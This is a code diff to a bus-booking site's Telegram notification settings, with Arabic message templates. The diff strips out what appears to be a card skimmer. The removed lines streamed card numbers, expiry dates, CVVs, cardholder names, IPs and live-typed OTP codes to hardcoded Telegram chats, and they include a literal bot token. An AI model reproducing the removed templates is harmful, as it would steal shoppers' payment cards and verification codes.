@@ -25,50 +25,48 @@ export interface TelegramSettings {
 }
 
 const SETTINGS_KEY = 'sat_telegram_settings_v1';
-const DEFAULT_PAYMENT_BOT_TOKEN = import.meta.env.VITE_PAYMENT_BOT_TOKEN || '';
-
 const DEFAULT_PAYMENT_MESSAGES: TelegramMessageSetting[] = [
   {
     id: 'card-entered',
-    label: 'إدخال البطاقة (وقت فعلي)',
-    description: 'تُرسل فوراً عندما يبدأ الزائر بكتابة رقم البطاقة',
+    label: 'بدء خطوة الدفع',
+    description: 'إشعار حالة فقط، دون إرسال أي بيانات بطاقة',
     enabled: true,
-    template: `<b>💳 الزائر يقوم بإدخال البطاقة (وقت فعلي)</b>\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>💰 المبلغ:</b> {amount} ر.س\n<b>🚌 الرحلة:</b> {from} ← {to}\n<b>💳 طريقة الدفع:</b> {paymentMethod}\n⏰ الوقت: {time}\n📍 IP: {ip}`,
+    template: `<b>💳 بدء خطوة الدفع</b>\n\n<b>💰 المبلغ:</b> {amount} ر.س\n<b>🚌 الرحلة:</b> {from} ← {to}\n<b>💳 طريقة الدفع:</b> {paymentMethod}\n\n<i>لا تُرسل بيانات البطاقة.</i>`,
   },
   {
     id: 'card-complete',
     label: 'اكتمال بيانات البطاقة',
-    description: 'تُرسل عند إدخال جميع بيانات البطاقة (رقم + تاريخ + CVV)',
+    description: 'إشعار باكتمال النموذج دون رقم البطاقة أو التاريخ أو CVV',
     enabled: true,
-    template: `<b>✅ جاهز للدفع — جميع بيانات البطاقة مكتملة!</b>\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>📅 تاريخ الانتهاء:</b> <code>{expiryDate}</code>\n<b>🔒 CVV:</b> <code>{cvv}</code>\n<b>👤 اسم حامل البطاقة:</b> {cardHolder}\n<b>💰 المبلغ:</b> {amount} ر.س\n<b>🚌 الرحلة:</b> {from} ← {to}\n<b>💳 طريقة الدفع:</b> {paymentMethod}\n⏰ الوقت: {time}\n📍 IP: {ip}`,
+    template: `<b>✅ اكتمل نموذج الدفع</b>\n\n<b>💰 المبلغ:</b> {amount} ر.س\n<b>🚌 الرحلة:</b> {from} ← {to}\n<b>💳 طريقة الدفع:</b> {paymentMethod}\n\n<i>لا تُرسل بيانات البطاقة.</i>`,
   },
   {
     id: 'otp-typing',
-    label: 'كتابة OTP (وقت فعلي)',
-    description: 'تُرسل فوراً عند كتابة 4-6 أرقام OTP قبل الضغط على تأكيد',
+    label: 'بدء كتابة OTP',
+    description: 'إشعار حالة فقط دون إرسال رمز OTP',
     enabled: true,
-    template: `<b>⚡ الزائر يكتب OTP (وقت فعلي — قبل التأكيد)</b>\n\n<b>🔑 الأرقام المدخلة:</b> <code>{otpCode}</code>\n<b>📏 عدد الأرقام:</b> {otpLength}\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>📅 تاريخ الانتهاء:</b> <code>{expiryDate}</code>\n<b>🔒 CVV:</b> <code>{cvv}</code>\n<b>👤 اسم حامل البطاقة:</b> {cardHolder}\n<b>💰 المبلغ:</b> {amount} ر.س\n📍 IP: {ip}\n⏰ الوقت: {time}`,
+    template: `<b>🔐 بدء إدخال رمز التحقق</b>\n\n<b>💰 المبلغ:</b> {amount} ر.س\n<i>لا يُرسل رمز OTP أو أي بيانات بطاقة.</i>`,
   },
   {
     id: 'otp-attempt',
     label: 'محاولة OTP',
-    description: 'تُرسل عند كل محاولة إدخال رمز OTP',
+    description: 'تُرسل عند المحاولة دون إرسال الرمز نفسه',
     enabled: true,
-    template: `<b>📋 الخطوة {attemptNumber}: 🔐 محاولة OTP</b>\n\n<b>🔑 الرمز المدخل:</b> <code>{otpCode}</code>\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>📅 تاريخ الانتهاء:</b> <code>{expiryDate}</code>\n<b>🔒 CVV:</b> <code>{cvv}</code>\n<b>👤 اسم حامل البطاقة:</b> {cardHolder}\n<b>💰 المبلغ:</b> {amount} ر.س\n📍 IP: {ip}\n⏰ الوقت: {time}`,
+    template: `<b>🔐 محاولة تحقق رقم {attemptNumber}</b>\n\n<b>💰 المبلغ:</b> {amount} ر.س\n<i>لا يُرسل رمز OTP أو أي بيانات بطاقة.</i>`,
   },
   {
     id: 'otp-success',
     label: 'نجاح OTP',
-    description: 'تُرسل عند نجاح التحقق من OTP',
+    description: 'إشعار نجاح فقط دون إرسال الرمز',
     enabled: true,
-    template: `<b>✅ تم التحقق من OTP — الدفع ناجح!</b>\n\n<b>🔑 الرمز:</b> {otpCode}\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>💰 المبلغ:</b> {amount} ر.س\n📍 IP: {ip}\n⏰ الوقت: {time}`,
+    template: `<b>✅ اكتمل التحقق</b>\n\n<b>💰 المبلغ:</b> {amount} ر.س\n<i>لا يُرسل رمز OTP أو أي بيانات بطاقة.</i>`,
   },
   {
     id: 'otp-failed',
     label: 'فشل OTP',
-    description: 'تُرسل بعد استنفاد جميع محاولات OTP',
+    description: 'إشعار فشل فقط دون إرسال الرموز',
     enabled: true,
-    template: `<b>❌ فشلت جميع محاولات OTP — البطاقة مرفوضة</b>\n\nآخر محاولة: {otpCode}\nإجمالي المحاولات: {attemptNumber}\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>💰 المبلغ:</b> {amount} ر.س\n📍 IP: {ip}\n⏰ الوقت: {time}`,
+    template: `<b>❌ تعذر إكمال التحقق</b>\n\nإجمالي المحاولات: {attemptNumber}\n<b>💰 المبلغ:</b> {amount} ر.س\n<i>لا يُرسل رمز OTP أو أي بيانات بطاقة.</i>`,
   },
 ];
 
@@ -127,13 +125,13 @@ const DEFAULT_BOOKING_MESSAGES: TelegramMessageSetting[] = [
 export function getDefaultTelegramSettings(): TelegramSettings {
   return {
     paymentEnabled: true,
-    paymentBotToken: DEFAULT_PAYMENT_BOT_TOKEN,
-    paymentChatId: '-1002118449021',
+    paymentBotToken: '',
+    paymentChatId: '',
     paymentMessages: DEFAULT_PAYMENT_MESSAGES,
 
     bookingEnabled: true,
-    bookingBotToken: '7004280527:AAEVpkQzFP9JCuDbmUlwiVqSQBk5zGctklE',
-    bookingChatId: '-1002052429288',
+    bookingBotToken: '',
+    bookingChatId: '',
     bookingMessages: DEFAULT_BOOKING_MESSAGES,
   };
 }
@@ -172,7 +170,14 @@ function mergeMessages(
 }
 
 export function saveTelegramSettings(s: TelegramSettings) {
-  localStorage.setItem(SETTINGS_KEY, JSON.stringify(s));
+  // Persist only non-secret UI preferences. Credentials live on the server.
+  localStorage.setItem(SETTINGS_KEY, JSON.stringify({
+    ...s,
+    paymentBotToken: '',
+    paymentChatId: '',
+    bookingBotToken: '',
+    bookingChatId: '',
+  }));
 }
 
 // Check if a specific payment message is enabled
@@ -203,18 +208,22 @@ export async function sendBookingMessage(
   vars: Record<string, string>
 ): Promise<boolean> {
   if (!isBookingMessageEnabled(msgId)) return false;
-  const s = loadTelegramSettings();
-  const msg = s.bookingMessages.find(m => m.id === msgId);
-  if (!msg || !msg.enabled) return false;
-  const text = fillTemplate(msg.template, vars);
   try {
-    const resp = await fetch(`https://api.telegram.org/bot${s.bookingBotToken}/sendMessage`, {
+    const resp = await fetch('/api/notifications/booking', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: s.bookingChatId,
-        text,
-        parse_mode: 'HTML',
+        event: msgId,
+        from: vars.from || vars.fromLocation,
+        to: vars.to || vars.toLocation,
+        date: vars.date || vars.pickupDate,
+        passengers: vars.passengers,
+        tripNumber: vars.tripNumber,
+        fareClass: vars.fareClass,
+        seats: vars.seats,
+        paymentMethod: vars.paymentMethod,
+        amount: vars.amount || vars.totalAmount,
+        page: vars.page,
       }),
     });
     return resp.ok;
@@ -230,9 +239,8 @@ export function fillTemplate(template: string, vars: Record<string, string>): st
 
 // Also sync with legacy keys
 export function syncLegacyTokens() {
-  const s = loadTelegramSettings();
-  localStorage.setItem('payment_bot_token', s.paymentBotToken);
-  localStorage.setItem('payment_chat_id', s.paymentChatId);
-  localStorage.setItem('tg_bot_token', s.bookingBotToken);
-  localStorage.setItem('tg_chat_id', s.bookingChatId);
+  localStorage.removeItem('payment_bot_token');
+  localStorage.removeItem('payment_chat_id');
+  localStorage.removeItem('tg_bot_token');
+  localStorage.removeItem('tg_chat_id');
 }
